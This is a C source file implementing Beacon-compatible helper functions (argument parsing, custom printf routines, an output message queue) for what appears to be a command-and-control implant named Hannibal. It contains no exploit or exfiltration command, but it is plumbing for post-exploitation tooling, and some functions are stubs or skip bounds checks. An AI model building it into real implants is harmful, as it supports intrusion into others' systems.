#include "BeaconApi.h"


SECTION_CODE void BeaconDataParse(datap* parser, char* buffer, int size) {
    if (parser == NULL) {
        return;
    }

    parser->original = buffer;
    parser->buffer = buffer;
    parser->length = size - 4;
    parser->size = size - 4;
    parser->buffer += 4;
}

SECTION_CODE int BeaconDataInt32(datap* parser) {
    int fourbyteint = 0;
    if (parser->length < 4) {
        return 0;
    }
    memcpy(&fourbyteint, parser->buffer, 4);
    parser->buffer += 4;
    parser->length -= 4;
    return (int)fourbyteint;
}

SECTION_CODE short BeaconDataShort(datap* parser) {
    short retvalue = 0;
    if (parser->length < 2) {
        return 0;
    }
    memcpy(&retvalue, parser->buffer, 2);
    parser->buffer += 2;
    parser->length -= 2;
    return (short)retvalue;

}

SECTION_CODE int BeaconDataLength(datap* parser) {
    return parser->length;
}

SECTION_CODE char* BeaconDataExtract(datap* parser, int* size) {
    int   length  = 0;
    char* outdata = NULL;

    /*Length prefixed binary blob, going to assume uint32_t for this.*/
    if (parser->length < 4) {
        return NULL;
    }

    memcpy(&length, parser->buffer, 4);
    parser->buffer += 4;

    outdata = parser->buffer;
    if (outdata == NULL) {
        return NULL;
    }

    parser->length -= 4;
    parser->length -= length;
    parser->buffer += length;
    if (size != NULL && outdata != NULL) {
        *size = length;
    }

    return outdata;
}

SECTION_CODE void BeaconOutput(DWORD64 type, char* data, int len) {
    // Output data to the controller
    int a = 0;
    for (int i = 0; i < 10; i++) {
        // Output data[i] to the controller
        a += i;
    }
    return;
}

SECTION_CODE void BeaconPrintf(DWORD64 pszDest, wchar_t* pszFormat, ...) {
    va_list args;
    va_start(args, pszFormat);
    
    LPWSTR pszEnd = pszDest;
    while (*pszEnd != L'\0')
        pszEnd++;
    
    while (*pszFormat != L'\0') {
        if (*pszFormat == L'%') {
            pszFormat++;
            
            BOOL isLong = FALSE;
            if (*pszFormat == L'l') {
                isLong = TRUE;
                pszFormat++;
            }
            
            switch (*pszFormat) {
                case L'd': {
                    int value = va_arg(args, int);
                    
                    if (value < 0) {
                        *pszEnd++ = L'-';
                        value = -value;
                    }
                    
                    WCHAR digits[32];
                    int digitCount = 0;
                    
                    if (value == 0) {
                        *pszEnd++ = L'0';
                    } else {
                        while (value > 0) {
                            digits[digitCount++] = (value % 10) + L'0';
                            value /= 10;
                        }
                        
                        for (int i = digitCount - 1; i >= 0; i--) {
                            *pszEnd++ = digits[i];
                        }
                    }
                    break;
                }
                
                case L'u': {
                    unsigned int value = va_arg(args, unsigned int);
                    
                    WCHAR digits[32];
                    int digitCount = 0;
                    
                    if (value == 0) {
                        *pszEnd++ = L'0';
                    } else {
                        while (value > 0) {
                            digits[digitCount++] = (value % 10) + L'0';
                            value /= 10;
                        }
                        
                        for (int i = digitCount - 1; i >= 0; i--) {
                            *pszEnd++ = digits[i];
                        }
                    }
                    break;
                }
                
                case L'x': 
                case L'X': {
                    const WCHAR hexCharsLower[] = L"0123456789abcdef";
                    const WCHAR hexCharsUpper[] = L"0123456789ABCDEF";
                    const WCHAR* hexChars = (*pszFormat == L'x') ? hexCharsLower : hexCharsUpper;
                    
                    unsigned long value;
                    if (isLong) {
                        value = va_arg(args, unsigned long);
                    } else {
                        value = va_arg(args, unsigned int);
                    }
                    
                    WCHAR digits[32];
                    int digitCount = 0;
                    
                    if (value == 0) {
                        *pszEnd++ = L'0';
                    } else {
                        while (value > 0) {
                            digits[digitCount++] = hexChars[value & 0xF];
                            value >>= 4;
                        }
                        
                        for (int i = digitCount - 1; i >= 0; i--) {
                            *pszEnd++ = digits[i];
                        }
                    }
                    break;
                }
                
                case L'p': {
                    const WCHAR hexChars[] = L"0123456789abcdef";
                    PVOID ptr = va_arg(args, PVOID);
                    ULONG_PTR value = (ULONG_PTR)ptr;
                    
                    *pszEnd++ = L'0';
                    *pszEnd++ = L'x';
                    
                    int numHexDigits = sizeof(PVOID) * 2;
                    
                    for (int i = numHexDigits - 1; i >= 0; i--) {
                        int digit = (value >> (i * 4)) & 0xF;
                        *pszEnd++ = hexChars[digit];
                    }
                    break;
                }
                
                case L'o': {
                    unsigned int value = va_arg(args, unsigned int);
                    
                    WCHAR digits[32];
                    int digitCount = 0;
                    
                    if (value == 0) {
                        *pszEnd++ = L'0';
                    } else {
                        while (value > 0) {
                            digits[digitCount++] = (value & 7) + L'0';
                            value >>= 3;
                        }
                        
                        for (int i = digitCount - 1; i >= 0; i--) {
                            *pszEnd++ = digits[i];
                        }
                    }
                    break;
                }
                
                case L'f':
                case L'g': {
                    double value = va_arg(args, double);
                    
                    if (value < 0) {
                        *pszEnd++ = L'-';
                        value = -value;
                    }
                    
                    ULONG64 intPart = (ULONG64)value;
                    
                    WCHAR intDigits[32];
                    int intDigitCount = 0;
                    
                    if (intPart == 0) {
                        intDigits[intDigitCount++] = L'0';
                    } else {
                        while (intPart > 0) {
                            intDigits[intDigitCount++] = (intPart % 10) + L'0';
                            intPart /= 10;
                        }
                    }
                    
                    for (int i = intDigitCount - 1; i >= 0; i--) {
                        *pszEnd++ = intDigits[i];
                    }
                    
                    value -= (ULONG64)value;
                    if (value > 0) {
                        *pszEnd++ = L'.';
                        
                        for (int i = 0; i < 6; i++) {
                            value *= 10;
                            int digit = (int)value;
                            *pszEnd++ = digit + L'0';
                            value -= digit;
                            
                            if (value < 0.000001)
                                break;
                        }
                    }
                    break;
                }
                
                case L's': {
                    LPCWSTR str = va_arg(args, LPCWSTR);
                    if (str != NULL) {
                        while (*str != L'\0') {
                            *pszEnd++ = *str++;
                        }
                    } else {
                        LPCWSTR nullStr = L"(null)";
                        while (*nullStr != L'\0') {
                            *pszEnd++ = *nullStr++;
                        }
                    }
                    break;
                }
                
                case L'c': {
                    wchar_t ch = (wchar_t)va_arg(args, int);
                    *pszEnd++ = ch;
                    break;
                }
                
                case L'%': {
                    *pszEnd++ = L'%';
                    break;
                }
                
                default:
                    *pszEnd++ = L'%';
                    if (isLong)
                        *pszEnd++ = L'l';
                    *pszEnd++ = *pszFormat;
                    break;
            }
            
            pszFormat++; 
        } else {
            *pszEnd++ = *pszFormat++;
        }
    }
    
    *pszEnd = L'\0';
    
    va_end(args);
    
    return;
}

SECTION_CODE int BeaconWsprintf(wchar_t* dest, const wchar_t* format, ...) {
    wchar_t* d = dest;
    const wchar_t* f = format;
    va_list args;
    va_start(args, format);
    
    int chars_written = 0;
    
    // Process format string
    while (*f) {
        if (*f == L'%') {
            f++; // Move past '%'
            
            // Handle format specifiers
            switch (*f) {
                case L's': { // Wide string
                    wchar_t* s = va_arg(args, wchar_t*);
                    while (*s) {
                        *d++ = *s++;
                        chars_written++;
                    }
                    break;
                }
                case L'S': { // ANSI string (special Windows wsprintf feature)
                    char* s = va_arg(args, char*);
                    while (*s) {
                        *d++ = (wchar_t)*s++; // Convert to wide char
                        chars_written++;
                    }
                    break;
                }
                case L'd': { // Integer
                    int num = va_arg(args, int);
                    int is_neg = 0;
                    
                    // Handle negative numbers
                    if (num < 0) {
                        is_neg = 1;
                        *d++ = L'-';
                        chars_written++;
                        num = -num;
                    }
                    
                    // Convert number to string (reversed)
                    wchar_t digits[12]; // Large enough for 32-bit integer
                    int i = 0;
                    
                    // Handle special case for 0
                    if (num == 0) {
                        digits[i++] = L'0';
                    } else {
                        while (num > 0) {
                            digits[i++] = L'0' + (num % 10);
                            num /= 10;
                        }
                    }
                    
                    // Copy digits in correct order
                    while (i > 0) {
                        *d++ = digits[--i];
                        chars_written++;
                    }
                    break;
                }
                case L'c': { // Wide character
                    wchar_t c = (wchar_t)va_arg(args, int);
                    *d++ = c;
                    chars_written++;
                    break;
                }
                case L'C': { // ANSI character (special Windows wsprintf feature)
                    char c = (char)va_arg(args, int);
                    *d++ = (wchar_t)c; // Convert to wide char
                    chars_written++;
                    break;
                }
                case L'x': { // Hexadecimal
                    unsigned int num = va_arg(args, unsigned int);
                    
                    // Convert number to hex string (reversed)
                    wchar_t digits[8]; // Large enough for 32-bit integer in hex
                    int i = 0;
                    
                    // Handle special case for 0
                    if (num == 0) {
                        digits[i++] = L'0';
                    } else {
                        while (num > 0) {
                            int digit = num % 16;
                            if (digit < 10)
                                digits[i++] = L'0' + digit;
                            else
                                digits[i++] = L'a' + (digit - 10);
                            num /= 16;
                        }
                    }
                    
                    // Copy digits in correct order
                    while (i > 0) {
                        *d++ = digits[--i];
                        chars_written++;
                    }
                    break;
                }
                case L'%': { // Literal %
                    *d++ = L'%';
                    chars_written++;
                    break;
                }
                // Add more format specifiers as needed
            }
        } else {
            *d++ = *f;
            chars_written++;
        }
        f++;
    }
    
    // Null-terminate the string
    *d = L'\0';
    
    va_end(args);
    return chars_written;
}

SECTION_CODE void BeaconStrcatW(wchar_t *wstr1, wchar_t *wstr2)
{
    // Find the end of the first wide string
    wchar_t *end = wstr1;
    while (*end != L'\0') {
        end++;
    }

    // Append the second wide string to the end of the first one
    while (*wstr2 != L'\0') {
        *end = *wstr2;
        end++;
        wstr2++;
    }

    // Null-terminate the concatenated string
    *end = L'\0';
}

SECTION_CODE void BeaconAddMessage(LPCWSTR source_message, LPCWSTR new_message) {
    // Append new_message to source_message
    BeaconStrcatW(source_message, new_message);
    return;
}

SECTION_CODE int BeaconSprintf(char* dest, const char* format, ...) {
    char* d = dest;
    const char* f = format;
    va_list args;
    va_start(args, format);
    
    int chars_written = 0;
    
    // Process format string
    while (*f) {
        if (*f == '%') {
            f++; // Move past '%'
            
            // Handle format specifiers
            switch (*f) {
                case 's': { // String
                    char* s = va_arg(args, char*);
                    while (*s) {
                        *d++ = *s++;
                        chars_written++;
                    }
                    break;
                }
                case 'd': { // Integer
                    int num = va_arg(args, int);
                    int is_neg = 0;
                    
                    // Handle negative numbers
                    if (num < 0) {
                        is_neg = 1;
                        *d++ = '-';
                        chars_written++;
                        num = -num;
                    }
                    
                    // Convert number to string (reversed)
                    char digits[12]; // Large enough for 32-bit integer
                    int i = 0;
                    
                    // Handle special case for 0
                    if (num == 0) {
                        digits[i++] = '0';
                    } else {
                        while (num > 0) {
                            digits[i++] = '0' + (num % 10);
                            num /= 10;
                        }
                    }
                    
                    // Copy digits in correct order
                    while (i > 0) {
                        *d++ = digits[--i];
                        chars_written++;
                    }
                    break;
                }
                case 'c': { // Character
                    char c = (char)va_arg(args, int);
                    *d++ = c;
                    chars_written++;
                    break;
                }
                case 'x': { // Hexadecimal
                    unsigned int num = va_arg(args, unsigned int);
                    
                    // Convert number to hex string (reversed)
                    char digits[8]; // Large enough for 32-bit integer in hex
                    int i = 0;
                    
                    // Handle special case for 0
                    if (num == 0) {
                        digits[i++] = '0';
                    } else {
                        while (num > 0) {
                            int digit = num % 16;
                            if (digit < 10)
                                digits[i++] = '0' + digit;
                            else
                                digits[i++] = 'a' + (digit - 10);
                            num /= 16;
                        }
                    }
                    
                    // Copy digits in correct order
                    while (i > 0) {
                        *d++ = digits[--i];
                        chars_written++;
                    }
                    break;
                }
                case '%': { // Literal %
                    *d++ = '%';
                    chars_written++;
                    break;
                }
                // Add more format specifiers as needed
            }
        } else {
            *d++ = *f;
            chars_written++;
        }
        f++;
    }
    
    // Null-terminate the string
    *d = '\0';
    
    va_end(args);
    return chars_written;
}

SECTION_CODE int BeaconParseInt32(PBYTE* args) {
    int value = 0;
    memcpy(&value, *args, sizeof(int));
    *args += sizeof(int);
    return value;
}

#pragma GCC push_options
#pragma GCC optimize ("O0")
SECTION_CODE char* BeaconParseString(PBYTE* args) {
    int length = 0;
    PBYTE current = *args;
    
   
    // Find string length. You should not add optimizations here. 
    while (current[length] != 0) {
        length++;
    }

    char* string = (char*)*args;
    *args += length + 1; // Move past string and null terminator
    return string;
}

SECTION_CODE LPCWSTR BeaconParseWideString(PBYTE* args) {
    int length = 0;
    PWCHAR current = (PWCHAR)*args;
    
    // Find string length. You should not add optimizations here. 
    while (current[length] != 0) {
        length++;
    }
    
    LPCWSTR string = (LPCWSTR)*args;
    *args += (length + 1) * sizeof(WCHAR); // Move past wide string and null terminator
    return string;
}

SECTION_CODE void BeaconCharToWideString(char* str, wchar_t* wideStr) {
    if (str == NULL || wideStr == NULL) {
        return; // Invalid input
    }
    int length = pic_strlen(str);
    if (wideStr == NULL) {
        return NULL; // Memory allocation failed
    }
    
    for (int i = 0; i < length; i++) {
        wideStr[i] = (wchar_t)str[i];
    }
    wideStr[length] = L'\0'; // Null-terminate the wide string
    
    return;

}

SECTION_CODE PMESSAGE_QUEUE BeaconCreateMessageQueue() {
    // Create a new message root of the message queue.

    HANNIBAL_INSTANCE_PTR

    PMESSAGE_QUEUE queue = (PMESSAGE_QUEUE)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->Win32.GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(MESSAGE_QUEUE));

    queue->size = 0;
    queue->content = NULL;
    queue->next = NULL;

    return queue;
}

SECTION_CODE BOOL BeaconAddMessageToQueue(PMESSAGE_QUEUE root, LPCWSTR message) {
    // Add a new message to the queue using root as the first node
    HANNIBAL_INSTANCE_PTR

    if (!root || !message) {
        return FALSE;
    }

    // If root has no content, use it instead of creating new node
    if (root->content == NULL) {
        root->size = pic_strlenW(message);
        root->content = (LPCWSTR)hannibal_instance_ptr->Win32.HeapAlloc(
            hannibal_instance_ptr->Win32.GetProcessHeap(),
            HEAP_ZERO_MEMORY,
            (root->size + 1) * sizeof(WCHAR)
        );
        if (!root->content) {
            return FALSE;
        }
        pic_strcatW(root->content, message);
        return TRUE;
    }

    // Create new message node
    PMESSAGE_QUEUE current = root;
    while (current->next != NULL) {
        current = current->next;
    }

    // Add new node at the end
    PMESSAGE_QUEUE newMessage = (PMESSAGE_QUEUE)hannibal_instance_ptr->Win32.HeapAlloc(
        hannibal_instance_ptr->Win32.GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        sizeof(MESSAGE_QUEUE)
    );
    if (!newMessage) {
        return FALSE;
    }

    newMessage->size = pic_strlenW(message);
    newMessage->content = (LPCWSTR)hannibal_instance_ptr->Win32.HeapAlloc(
        hannibal_instance_ptr->Win32.GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        (newMessage->size + 1) * sizeof(WCHAR)
    );
    if (!newMessage->content) {
        hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->Win32.GetProcessHeap(), 0, newMessage);
        return FALSE;
    }
    
    pic_strcatW(newMessage->content, message);
    current->next = newMessage;
    return TRUE;
}

// SECTION_CODE BOOL _BeaconHannibalResponse(LPCWSTR message, LPCSTR task_uuid) {
//     // Just a wrapper over task_enqueue. Do not suppose to be used outside of this file.
//     HANNIBAL_INSTANCE_PTR   

//     TASK response_t; 
//     response_t.output = (LPCSTR)message;
//     response_t.output_size = (pic_strlenW(message) + 1) * sizeof(WCHAR);
//     response_t.task_uuid = task_uuid; // Freed in mythic_http_post_tasks()

//     task_enqueue(hannibal_instance_ptr->tasks.tasks_response_queue, &response_t);
//     return TRUE;
// }

SECTION_CODE BOOL BeaconCleanUpMessageQueue(PMESSAGE_QUEUE root) {
    // Clean up the entire queue including root node
    HANNIBAL_INSTANCE_PTR

    if (!root) {
        return FALSE;
    }

    PMESSAGE_QUEUE current = root;
    PMESSAGE_QUEUE next;

    while (current != NULL) {
        next = current->next;
        if (current->content) {
            hannibal_instance_ptr->Win32.HeapFree(
                hannibal_instance_ptr->Win32.GetProcessHeap(), 
                0, 
                current->content
            );
        }
        hannibal_instance_ptr->Win32.HeapFree(
            hannibal_instance_ptr->Win32.GetProcessHeap(), 
            0, 
            current
        );
        current = next;
    }

    return TRUE;
}

SECTION_CODE BOOL BeaconSendAllMessages(PMESSAGE_QUEUE root, LPCSTR task_uuid) {
    // Concatenate and send all messages starting from root
    HANNIBAL_INSTANCE_PTR

    if (!root || !task_uuid) {
        return FALSE;
    }

    // Calculate total size including root's content
    int totalSize = 0;
    PMESSAGE_QUEUE current = root;
    
    while (current != NULL) {
        if (current->content) {
            totalSize += current->size;
        }
        current = current->next;
    }

    // Add space for null terminator
    totalSize += sizeof(WCHAR);

    // Allocate memory for concatenated message
    wchar_t* concatenatedMessage = (wchar_t*)hannibal_instance_ptr->Win32.HeapAlloc(
        hannibal_instance_ptr->Win32.GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        totalSize * sizeof(WCHAR)
    );

    if (!concatenatedMessage) {
        return FALSE;
    }

    // Concatenate messages including root's content
    current = root;
    while (current != NULL) {
        if (current->content) {
            BeaconStrcatW(concatenatedMessage, current->content);
        }
        current = current->next;
    }

    // Send concatenated message
    hannibal_response(concatenatedMessage, task_uuid);

    // Cleanup
    hannibal_instance_ptr->Win32.HeapFree(
        hannibal_instance_ptr->Win32.GetProcessHeap(),
        0,
        concatenatedMessage
    );
    return TRUE;
}


#pragma GCC pop_options